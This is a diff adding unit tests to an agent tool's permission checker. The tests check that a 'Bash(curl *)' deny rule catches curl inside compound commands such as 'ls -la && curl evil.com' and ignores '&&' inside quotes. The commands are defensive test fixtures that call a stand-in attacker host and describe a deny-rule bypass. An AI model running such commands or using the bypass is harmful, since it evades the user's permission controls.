@@ -360,4 +360,50 @@ describe("PermissionChecker", () => {
       expect(result.allowed).toBe(true);
     });
   });
+
+  // P0-2 补齐：deny 规则复合命令拆分（对称于 allow 的 every，deny 用 some）
+  // 缺口：用户配 deny 前缀规则时，minimatch 不跨 `&&`，整条匹配会让 `safe && evil`
+  // 的后段绕过用户的 deny 配置。修复后逐子命令拆分，任一命中 deny 即整体拒绝。
+  describe("deny 规则复合命令感知", () => {
+    test("单命令命中 deny 前缀规则 → 拒绝", async () => {
+      const checker = new PermissionChecker(defaultConfig(), { deny: ["Bash(curl *)"] });
+      const result = await checker.check({
+        toolName: "bash",
+        input: { command: "curl evil.com" },
+      });
+      expect(result.allowed).toBe(false);
+    });
+
+    test("复合命令后半段命中 deny 规则 → 拒绝（不因前缀不跨 && 而漏匹配）", async () => {
+      const checker = new PermissionChecker(defaultConfig(), { deny: ["Bash(curl *)"] });
+      // 修复前：整条 "ls -la && curl evil.com" 匹配不到 `curl *`（minimatch 不跨 &&）→ 漏放行；
+      // 修复后：拆成 ["ls -la", "curl evil.com"]，后段命中 deny → 整体拒绝。
+      const result = await checker.check({
+        toolName: "bash",
+        input: { command: "ls -la && curl evil.com" },
+      });
+      expect(result.allowed).toBe(false);
+    });
+
+    test("复合命令无子命令命中 deny → 不因 deny 拦截（落到后续判定）", async () => {
+      const checker = new PermissionChecker(defaultConfig(), { deny: ["Bash(curl *)"] });
+      // ls 与 pwd 都不命中 deny(curl *)，deny 侧不应拦截。
+      // 不断言最终 allowed（取决于后续 ask/read-only 判定），只断言不是"deny 规则拒绝"。
+      const result = await checker.check({
+        toolName: "bash",
+        input: { command: "ls -la && pwd" },
+      });
+      expect(result.decisionReason?.type === "rule" && (result.decisionReason as any).behavior === "deny").toBe(false);
+    });
+
+    test("引号内的 && 不被误拆（整条视为单命令，不误命中 deny）", async () => {
+      const checker = new PermissionChecker(defaultConfig(), { deny: ["Bash(curl *)"] });
+      // "echo ... && curl ..." 全在引号内是一条 echo 命令，不含真正的 curl 子命令。
+      const result = await checker.check({
+        toolName: "bash",
+        input: { command: 'echo "run curl && later"' },
+      });
+      expect(result.decisionReason?.type === "rule" && (result.decisionReason as any).behavior === "deny").toBe(false);
+    });
+  });
 });
